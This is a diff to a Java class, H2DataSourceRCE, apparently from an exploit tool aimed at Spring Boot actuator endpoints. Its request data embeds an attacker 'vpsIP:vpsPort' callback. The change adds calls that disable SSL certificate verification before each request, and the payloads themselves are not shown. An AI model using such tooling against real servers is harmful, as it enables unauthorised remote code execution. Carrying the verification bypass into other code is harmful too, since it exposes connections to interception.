@@ -11,6 +11,8 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Stream;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class H2DataSourceRCE {
     private String address;
     public  String text;
@@ -35,6 +37,7 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData1,vpsIP + ":" + vpsPort);
+        disableSSLVerification();
         try {
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -123,6 +126,7 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData2,vpsIP + ":" + vpsPort);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -207,6 +211,7 @@ public class H2DataSourceRCE {
         Stream.Builder<String> builder = Stream.builder();
         String api ="/actuator/env";
         String site = address + api;
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
